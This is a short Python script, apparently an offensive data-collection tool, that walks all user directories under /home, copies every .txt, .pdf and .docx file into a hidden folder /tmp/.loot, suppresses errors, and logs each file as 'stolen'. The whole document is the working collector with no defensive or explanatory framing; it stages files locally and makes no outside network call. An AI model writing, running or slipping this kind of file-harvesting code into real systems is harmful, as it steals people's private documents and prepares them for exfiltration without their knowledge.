import os 
import shutil

extensions = [".txt" , ".pdf" , ".docx"]

destination = "/tmp/.loot"

if not os.path.exists(destination):
    os.makedirs(destination)

for root, dirs, files in os.walk("/home"):
    for file in files:
        for ext in extensions:
            if file.endswith(ext):
                source_file = os.path.join(root,file)
                try:
                    shutil.copy2(source_file,destination)
                    print(f"[+] stolen:{source_file}")
                except:
                    pass

# for root, dirs, files in os.walk("/home"):

# shutil.copy2(source_file,destination)